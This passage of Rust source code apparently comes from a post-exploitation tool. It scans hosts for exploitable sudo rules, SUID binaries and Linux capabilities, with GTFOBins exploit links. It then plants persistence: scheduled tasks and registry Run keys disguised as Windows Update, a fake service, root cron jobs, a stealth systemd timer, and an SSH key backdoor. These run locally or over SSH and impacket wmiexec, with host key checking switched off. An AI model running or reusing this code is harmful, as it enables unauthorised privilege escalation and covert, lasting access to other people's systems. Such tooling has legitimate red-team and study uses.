    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    // Dangerous sudo configurations
    let dangerous_patterns = vec![
        ("NOPASSWD", "NOPASSWD entry allows command execution without password"),
        ("ALL=(ALL)", "Full sudo access to all commands"),
        ("ALL=(root)", "Full sudo access as root"),
        ("(ALL : ALL)", "Full sudo access with group switching"),
        ("!requiretty", "TTY not required, can run from scripts"),
        ("env_keep", "Environment variables preserved, potential injection"),
    ];

    // Commands that can be exploited for shell escape
    let exploitable_commands = vec![
        "vi", "vim", "nano", "less", "more", "man", "find", "awk",
        "perl", "python", "python3", "ruby", "php", "lua", "node",
        "bash", "sh", "zsh", "ksh", "csh",
        "tar", "zip", "gzip", "env", "ftp", "sftp",
        "nmap", "nc", "netcat", "socat", "wget", "curl",
        "git", "docker", "lxc", "mount", "rsync",
        "tee", "dd", "cp", "mv",
    ];

    let mut findings = Vec::new();

    let sudo_cmd = "sudo -l 2>/dev/null";

    let output = if is_local {
        Command::new("sh")
            .args(["-c", sudo_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckSudoers,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote sudo check".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-o".to_string(), "ConnectTimeout=10".to_string(),
        ];

        let cmd_name = if creds.password.is_some() {
            ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
            ssh_args.insert(0, "-p".to_string());
            "sshpass"
        } else {
            "ssh"
        };

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(sudo_cmd.to_string());

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new(cmd_name)
                .args(&ssh_args)
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Check for dangerous patterns
        for (pattern, description) in &dangerous_patterns {
            if stdout.contains(pattern) {
                let mut details = HashMap::new();
                details.insert("pattern".to_string(), serde_json::json!(pattern));
                details.insert("description".to_string(), serde_json::json!(description));

                let severity = if *pattern == "NOPASSWD" || pattern.contains("ALL") {
                    Severity::Critical
                } else {
                    Severity::High
                };

                findings.push(make_finding_with_details(
                    "sudo_config",
                    pattern,
                    details,
                    severity,
                ));
            }
        }

        // Check for exploitable commands
        for line in stdout.lines() {
            if line.contains("may run") || line.contains("NOPASSWD") || line.contains("/") {
                for cmd in &exploitable_commands {
                    if line.contains(cmd) {
                        let is_nopasswd = line.contains("NOPASSWD");

                        let mut details = HashMap::new();
                        details.insert("command".to_string(), serde_json::json!(cmd));
                        details.insert("line".to_string(), serde_json::json!(line.trim()));
                        details.insert("nopasswd".to_string(), serde_json::json!(is_nopasswd));
                        details.insert("exploit_url".to_string(),
                            serde_json::json!(format!("https://gtfobins.github.io/gtfobins/{}/#sudo", cmd)));

                        findings.push(make_finding_with_details(
                            "sudo_exploitable_command",
                            *cmd,
                            details,
                            if is_nopasswd { Severity::Critical } else { Severity::High },
                        ));
                    }
                }
            }
        }

        // If we can sudo to ALL commands
        if stdout.contains("(ALL : ALL)") || stdout.contains("(root) ALL") || stdout.contains("(ALL) ALL") {
            let mut details = HashMap::new();
            details.insert("type".to_string(), serde_json::json!("full_sudo_access"));
            details.insert("output".to_string(), serde_json::json!(stdout.chars().take(500).collect::<String>()));

            findings.push(make_finding_with_details(
                "sudo_full_access",
                "Full sudo access available",
                details,
                Severity::Critical,
            ));
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::CheckSudoers,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No exploitable sudo configuration found".to_string()) },
        timestamp: Utc::now(),
    })
}

async fn check_suid(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Checking for SUID binaries on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    // GTFOBins - list of binaries known to have privilege escalation potential
    let gtfobins: std::collections::HashSet<&str> = [
        "bash", "sh", "dash", "zsh", "ksh", "csh", "tcsh",
        "python", "python2", "python3", "perl", "ruby", "php", "lua", "node",
        "vim", "vi", "nano", "less", "more", "view", "emacs",
        "find", "xargs", "awk", "gawk", "nawk", "mawk", "sed",
        "tar", "zip", "unzip", "gzip", "gunzip", "bzip2",
        "nmap", "nc", "netcat", "ncat", "socat",
        "curl", "wget", "ftp", "sftp", "scp", "ssh", "telnet",
        "docker", "lxc", "kubectl", "podman",
        "env", "time", "strace", "ltrace", "tcpdump", "wireshark",
        "cp", "mv", "dd", "rsync", "busybox",
        "git", "svn", "hg",
        "man", "pager", "ed", "ex", "pico",
        "nice", "ionice", "taskset", "watch", "timeout",
        "base64", "xxd", "hexdump", "od",
        "rlwrap", "expect", "screen", "tmux",
        "mount", "umount", "fusermount",
        "passwd", "chpasswd", "chfn", "chsh",
        "su", "sudo", "sudoedit", "doas",
        "pkexec", "gdb", "capsh", "setcap",
        "aria2c", "ash", "csvtool", "dmesg", "dmsetup",
        "gtester", "hping3", "jjs", "jq", "jrunscript",
        "logsave", "make", "msfconsole", "mysql",
        "openssl", "openvpn", "pip", "puppet", "rake",
        "rvim", "snap", "sqlite3", "start-stop-daemon",
        "stdbuf", "tclsh", "tee", "tftp", "wish",
    ].iter().cloned().collect();

    let mut findings = Vec::new();

    let find_cmd = "find / -perm -4000 -type f 2>/dev/null | head -100";

    let output = if is_local {
        Command::new("sh")
            .args(["-c", find_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckSuid,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote SUID check".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-o".to_string(), "ConnectTimeout=10".to_string(),
        ];

        let cmd_name = if creds.password.is_some() {
            ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
            ssh_args.insert(0, "-p".to_string());
            "sshpass"
        } else {
            "ssh"
        };

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(find_cmd.to_string());

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new(cmd_name)
                .args(&ssh_args)
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        for line in stdout.lines() {
            let binary_path = line.trim();
            if binary_path.is_empty() {
                continue;
            }

            let binary_name = std::path::Path::new(binary_path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");

            let is_exploitable = gtfobins.contains(binary_name);
            let severity = if is_exploitable {
                Severity::Critical
            } else if binary_name.contains("custom") ||
                      binary_name.contains("test") ||
                      !binary_path.starts_with("/usr") {
                Severity::High
            } else {
                Severity::Low
            };

            let mut details = HashMap::new();
            details.insert("path".to_string(), serde_json::json!(binary_path));
            details.insert("binary".to_string(), serde_json::json!(binary_name));
            details.insert("gtfobins".to_string(), serde_json::json!(is_exploitable));

            if is_exploitable {
                details.insert("exploit_url".to_string(),
                    serde_json::json!(format!("https://gtfobins.github.io/gtfobins/{}/#suid", binary_name)));
                details.insert("note".to_string(),
                    serde_json::json!("This binary is in GTFOBins and may be exploitable for privilege escalation"));
            }

            findings.push(make_finding_with_details(
                if is_exploitable { "suid_exploitable" } else { "suid_binary" },
                binary_path,
                details,
                severity,
            ));
        }
    }

    let success = !findings.is_empty();
    let exploitable_count = findings.iter()
        .filter(|f| f.finding_type == "suid_exploitable")
        .count();

    Ok(PostExploitResult {
        module: PostExploitModule::CheckSuid,
        target: config.target.clone(),
        success,
        findings,
        error: if success {
            if exploitable_count > 0 {
                Some(format!("Found {} potentially exploitable SUID binaries", exploitable_count))
            } else {
                None
            }
        } else {
            Some("No SUID binaries found or access denied".to_string())
        },
        timestamp: Utc::now(),
    })
}

async fn check_capabilities(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Checking Linux capabilities on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    // Dangerous capabilities that can lead to privilege escalation
    let dangerous_caps: std::collections::HashMap<&str, &str> = [
        ("cap_setuid", "Can set UID - direct privilege escalation"),
        ("cap_setgid", "Can set GID - can join privileged groups"),
        ("cap_sys_admin", "Broad administrative capabilities - many escalation paths"),
        ("cap_sys_ptrace", "Can ptrace processes - code injection possible"),
        ("cap_sys_module", "Can load kernel modules - kernel-level access"),
        ("cap_dac_override", "Bypass file read/write/execute permission checks"),
        ("cap_dac_read_search", "Bypass file read permission checks"),
        ("cap_chown", "Can change file ownership - take ownership of privileged files"),
        ("cap_fowner", "Bypass permission checks on file owner ID"),
        ("cap_net_admin", "Network configuration - can sniff/modify traffic"),
        ("cap_net_raw", "Use raw sockets - network attacks possible"),
        ("cap_sys_rawio", "Direct I/O port operations"),
        ("cap_mknod", "Create special files - potential persistence"),
        ("cap_net_bind_service", "Bind to privileged ports < 1024"),
        ("cap_linux_immutable", "Can modify immutable files"),
    ].iter().cloned().collect();

    let mut findings = Vec::new();

    let getcap_cmd = "getcap -r / 2>/dev/null | head -100";

    let output = if is_local {
        Command::new("sh")
            .args(["-c", getcap_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckCapabilities,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote capabilities check".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-o".to_string(), "ConnectTimeout=10".to_string(),
        ];

        let cmd_name = if creds.password.is_some() {
            ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
            ssh_args.insert(0, "-p".to_string());
            "sshpass"
        } else {
            "ssh"
        };

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(getcap_cmd.to_string());

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new(cmd_name)
                .args(&ssh_args)
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        for line in stdout.lines() {
            let line = line.trim();
            if line.is_empty() || !line.contains("=") {
                continue;
            }

            // Parse: /path/to/binary = cap1,cap2+ep
            let parts: Vec<&str> = line.split('=').collect();
            if parts.len() < 2 {
                continue;
            }

            let binary_path = parts[0].trim();
            let caps_str = parts[1].trim();

            let binary_name = std::path::Path::new(binary_path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");

            let mut is_dangerous = false;
            let mut dangerous_found = Vec::new();

            for (cap, desc) in &dangerous_caps {
                if caps_str.to_lowercase().contains(cap) {
                    is_dangerous = true;
                    dangerous_found.push(format!("{}: {}", cap, desc));
                }
            }

            let severity = if is_dangerous && (caps_str.contains("+ep") || caps_str.contains("+eip")) {
                Severity::Critical
            } else if is_dangerous {
                Severity::High
            } else {
                Severity::Medium
            };

            let mut details = HashMap::new();
            details.insert("path".to_string(), serde_json::json!(binary_path));
            details.insert("binary".to_string(), serde_json::json!(binary_name));
            details.insert("capabilities".to_string(), serde_json::json!(caps_str));
            details.insert("is_dangerous".to_string(), serde_json::json!(is_dangerous));

            if !dangerous_found.is_empty() {
                details.insert("dangerous_capabilities".to_string(), serde_json::json!(dangerous_found));
                details.insert("exploit_url".to_string(),
                    serde_json::json!(format!("https://gtfobins.github.io/gtfobins/{}/#capabilities", binary_name)));
            }

            findings.push(make_finding_with_details(
                if is_dangerous { "capability_dangerous" } else { "capability" },
                binary_path,
                details,
                severity,
            ));
        }
    }

    let success = !findings.is_empty();
    let dangerous_count = findings.iter()
        .filter(|f| f.finding_type == "capability_dangerous")
        .count();

    Ok(PostExploitResult {
        module: PostExploitModule::CheckCapabilities,
        target: config.target.clone(),
        success,
        findings,
        error: if success {
            if dangerous_count > 0 {
                Some(format!("Found {} binaries with dangerous capabilities", dangerous_count))
            } else {
                None
            }
        } else {
            Some("No capabilities found or getcap not available".to_string())
        },
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Persistence
// ============================================================================

async fn create_scheduled_task(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Create a Windows scheduled task for persistence
    info!("Creating scheduled task on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get task name (required)
    let task_name = config.options.get("task_name")
        .and_then(|v| v.as_str())
        .unwrap_or("SystemHealthCheck");

    // Get command to run (required)
    let command = match config.options.get("command").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::CreateScheduledTask,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("command option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get trigger type
    let trigger = config.options.get("trigger")
        .and_then(|v| v.as_str())
        .unwrap_or("onlogon"); // onlogon, daily, onstart, onidle

    // Get run level
    let run_level = config.options.get("run_level")
        .and_then(|v| v.as_str())
        .unwrap_or("highest"); // highest or limited

    // Build schtasks command
    let schtasks_cmd = match trigger {
        "daily" => {
            let time = config.options.get("time")
                .and_then(|v| v.as_str())
                .unwrap_or("09:00");
            format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /sc daily /st {} /rl {} /f",
                task_name, command, time, run_level
            )
        }
        "onstart" => {
            format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /sc onstart /rl {} /f",
                task_name, command, run_level
            )
        }
        "onidle" => {
            format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /sc onidle /i 5 /rl {} /f",
                task_name, command, run_level
            )
        }
        _ => { // onlogon
            format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /rl {} /f",
                task_name, command, run_level
            )
        }
    };

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", &schtasks_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CreateScheduledTask,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote scheduled task creation".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Use impacket's atexec or wmiexec for remote task creation
        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            schtasks_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    let success = if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if output.status.success() || stdout.contains("SUCCESS") {
            let mut details = HashMap::new();
            details.insert("task_name".to_string(), serde_json::json!(task_name));
            details.insert("command".to_string(), serde_json::json!(command));
            details.insert("trigger".to_string(), serde_json::json!(trigger));
            details.insert("run_level".to_string(), serde_json::json!(run_level));
            details.insert("persistence_type".to_string(), serde_json::json!("scheduled_task"));

            findings.push(make_finding_with_details(
                "scheduled_task_created",
                task_name,
                details,
                Severity::High,
            ));
            true
        } else {
            false
        }
    } else {
        false
    };

    Ok(PostExploitResult {
        module: PostExploitModule::CreateScheduledTask,
        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to create scheduled task".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

async fn add_registry_run_key(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Add a registry Run key for persistence (runs on user login)
    info!("Adding registry run key on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get value name
    let value_name = config.options.get("value_name")
        .and_then(|v| v.as_str())
        .unwrap_or("WindowsUpdate");

    // Get command to run (required)
    let command = match config.options.get("command").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::AddRegistryRunKey,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("command option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get registry hive (HKCU = current user, HKLM = all users)
    let hive = config.options.get("hive")
        .and_then(|v| v.as_str())
        .unwrap_or("HKCU"); // HKCU or HKLM

    // Get key type
    let key_type = config.options.get("key_type")
        .and_then(|v| v.as_str())
        .unwrap_or("Run"); // Run, RunOnce, RunOnceEx

    let reg_path = format!(
        "{}\\Software\\Microsoft\\Windows\\CurrentVersion\\{}",
        hive, key_type
    );

    // Build reg add command
    let reg_cmd = format!(
        "reg add \"{}\" /v \"{}\" /t REG_SZ /d \"{}\" /f",
        reg_path, value_name, command
    );

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", &reg_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::AddRegistryRunKey,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote registry modification".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Use impacket's wmiexec for remote registry modification
        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            reg_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    let success = if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if output.status.success() || stdout.contains("successfully") {
            let mut details = HashMap::new();
            details.insert("registry_path".to_string(), serde_json::json!(reg_path));
            details.insert("value_name".to_string(), serde_json::json!(value_name));
            details.insert("command".to_string(), serde_json::json!(command));
            details.insert("hive".to_string(), serde_json::json!(hive));
            details.insert("key_type".to_string(), serde_json::json!(key_type));
            details.insert("persistence_type".to_string(), serde_json::json!("registry_run_key"));
            details.insert("triggers_on".to_string(), serde_json::json!(
                if hive == "HKLM" { "Any user login" } else { "Current user login" }
            ));

            findings.push(make_finding_with_details(
                "registry_run_key_added",
                value_name,
                details,
                Severity::High,
            ));
            true
        } else {
            false
        }
    } else {
        false
    };

    Ok(PostExploitResult {
        module: PostExploitModule::AddRegistryRunKey,
        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to add registry run key".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

async fn create_service(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Create a Windows service for persistence
    info!("Creating service on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get service name
    let service_name = config.options.get("service_name")
        .and_then(|v| v.as_str())
        .unwrap_or("WinUpdateSvc");

    // Get display name
    let display_name = config.options.get("display_name")
        .and_then(|v| v.as_str())
        .unwrap_or("Windows Update Service Helper");

    // Get binary path (required)
    let bin_path = match config.options.get("bin_path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::CreateService,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("bin_path option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get start type
    let start_type = config.options.get("start_type")
        .and_then(|v| v.as_str())
        .unwrap_or("auto"); // auto, demand, disabled

    // Build sc create command
    let sc_cmd = format!(
        "sc create \"{}\" binPath= \"{}\" DisplayName= \"{}\" start= {}",
        service_name, bin_path, display_name, start_type
    );

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", &sc_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CreateService,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote service creation".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Use sc.exe with remote target or impacket
        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            sc_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    let mut success = false;
    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if output.status.success() || stdout.contains("SUCCESS") || stdout.contains("CreateService") {
            success = true;

            // Try to start the service if auto_start option is set
            let auto_start = config.options.get("auto_start")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);

            if auto_start {
                let start_cmd = format!("sc start \"{}\"", service_name);
                let _ = if is_local {
                    Command::new("cmd").args(["/c", &start_cmd]).output().await
                } else {
                    let creds = config.credentials.as_ref().unwrap();
                    let wmi_start = format!(
                        "wmiexec.py {}:{}@{} \"{}\"",
                        creds.username,
                        creds.password.as_deref().unwrap_or(""),
                        config.target,
                        start_cmd
                    );
                    Command::new("python3")
                        .args(["-c", &format!("import os; os.system('{}')", wmi_start)])
                        .output()
                        .await
                };
            }

            let mut details = HashMap::new();
            details.insert("service_name".to_string(), serde_json::json!(service_name));
            details.insert("display_name".to_string(), serde_json::json!(display_name));
            details.insert("bin_path".to_string(), serde_json::json!(bin_path));
            details.insert("start_type".to_string(), serde_json::json!(start_type));
            details.insert("persistence_type".to_string(), serde_json::json!("windows_service"));
            details.insert("runs_as".to_string(), serde_json::json!("SYSTEM"));

            findings.push(make_finding_with_details(
                "service_created",
                service_name,
                details,
                Severity::Critical,
            ));
        }
    }

    Ok(PostExploitResult {
        module: PostExploitModule::CreateService,
        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to create service".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

async fn add_cron_job(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Add a cron job for persistent command execution
    info!("Adding cron job on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get command to run (required)
    let command = match config.options.get("command").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::AddCronJob,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("command option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get cron schedule (default: every 5 minutes)
    let schedule = config.options.get("schedule")
        .and_then(|v| v.as_str())
        .unwrap_or("*/5 * * * *");

    // Get target user (default: root)
    let target_user = config.options.get("target_user")
        .and_then(|v| v.as_str())
        .unwrap_or("root");

    // Method to add cron job
    let method = config.options.get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("crontab"); // crontab, crond, or systemd

    let cron_line = format!("{} {}", schedule, command);

    let add_cmd = match method {
        "crond" => {
            // Write to /etc/cron.d/
            let cron_file = config.options.get("cron_name")
                .and_then(|v| v.as_str())
                .unwrap_or("system_update");
            format!(
                "echo '{} {} {}' > /etc/cron.d/{}",
                schedule, target_user, command, cron_file
            )
        }
        "systemd" => {
            // Create systemd timer (more stealthy)
            let timer_name = config.options.get("timer_name")
                .and_then(|v| v.as_str())
                .unwrap_or("system-maintenance");
            format!(
                r#"cat > /etc/systemd/system/{}.service << 'EOF'
[Unit]
Description=System Maintenance Service

[Service]
Type=oneshot
ExecStart={}
EOF
cat > /etc/systemd/system/{}.timer << 'EOF'
[Unit]
Description=System Maintenance Timer

[Timer]
OnCalendar=*:0/5
Persistent=true

[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload && systemctl enable --now {}.timer"#,
                timer_name, command, timer_name, timer_name
            )
        }
        _ => {
            // Default: use crontab command
            format!(
                "(crontab -l 2>/dev/null; echo '{}') | crontab -",
                cron_line
            )
        }
    };

    let output = if is_local {
        Command::new("sh")
            .args(["-c", &add_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::AddCronJob,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote cron job creation".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let ssh_cmd = format!("ssh -o StrictHostKeyChecking=no {}@{} '{}'",
            creds.username, config.target, add_cmd.replace("'", "'\\''"));

        if creds.password.is_some() {
            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("sshpass")
                    .args(["-p", creds.password.as_ref().unwrap(), "sh", "-c", &ssh_cmd])
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        } else {
            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("sh")
                    .args(["-c", &ssh_cmd])
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        }
    };

    let success = if let Ok(output) = output {
        if output.status.success() {
            let mut details = HashMap::new();
            details.insert("schedule".to_string(), serde_json::json!(schedule));
            details.insert("command".to_string(), serde_json::json!(command));
            details.insert("method".to_string(), serde_json::json!(method));
            details.insert("user".to_string(), serde_json::json!(target_user));
            details.insert("persistence_type".to_string(), serde_json::json!("cron_job"));

            findings.push(make_finding_with_details(
                "cron_job_added",
                command,
                details,
                Severity::High,
            ));
            true
        } else {
            false
        }
    } else {
        false
    };

    Ok(PostExploitResult {
        module: PostExploitModule::AddCronJob,
        target: config.target.clone(),
        success,
        findings,
        error: if !success { Some("Failed to add cron job".to_string()) } else { None },
        timestamp: Utc::now(),
    })
}

async fn add_ssh_key(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Add an SSH public key to authorized_keys for persistent access
    info!("Adding SSH authorized key on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get the public key to add (required)
    let public_key = match config.options.get("public_key").and_then(|v| v.as_str()) {
        Some(k) => k,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::AddSshKey,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("public_key option is required".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Get target user (default: current user or root)
    let target_user = config.options.get("target_user")
        .and_then(|v| v.as_str())
        .unwrap_or("root");

    // Determine home directory
    let home_dir = if target_user == "root" {
        "/root".to_string()
    } else {
        format!("/home/{}", target_user)
    };

    let ssh_dir = format!("{}/.ssh", home_dir);
    let authorized_keys = format!("{}/authorized_keys", ssh_dir);

    // Commands to add the key
    let commands = format!(
        "mkdir -p '{}' && chmod 700 '{}' && echo '{}' >> '{}' && chmod 600 '{}'",
        ssh_dir, ssh_dir, public_key, authorized_keys, authorized_keys
    );

    let output = if is_local {
        Command::new("sh")
            .args(["-c", &commands])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::AddSshKey,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote SSH key addition".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
        ];

        if let Some(key_path) = &creds.ssh_key {
            ssh_args.push("-i".to_string());
            ssh_args.push(key_path.clone());
        }

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(commands);

        if creds.password.is_some() {
            let mut full_args = vec!["-p".to_string(), creds.password.clone().unwrap()];
            full_args.extend(ssh_args);
            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("sshpass")
                    .args(&full_args)
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        } else {
            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("ssh")
                    .args(&ssh_args)
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        }
    };

    let success = if let Ok(output) = output {
        if output.status.success() {
            let mut details = HashMap::new();
            details.insert("user".to_string(), serde_json::json!(target_user));
            details.insert("authorized_keys_path".to_string(), serde_json::json!(authorized_keys));
            details.insert("key_fingerprint".to_string(), serde_json::json!(
                public_key.split_whitespace().take(2).collect::<Vec<_>>().join(" ")
            ));
            details.insert("persistence_type".to_string(), serde_json::json!("ssh_authorized_key"));

            findings.push(make_finding_with_details(
                "ssh_key_added",
                target_user,
                details,
                Severity::High,
            ));
            true
        } else {
            false
        }
    } else {
        false
    };

    Ok(PostExploitResult {
        module: PostExploitModule::AddSshKey,
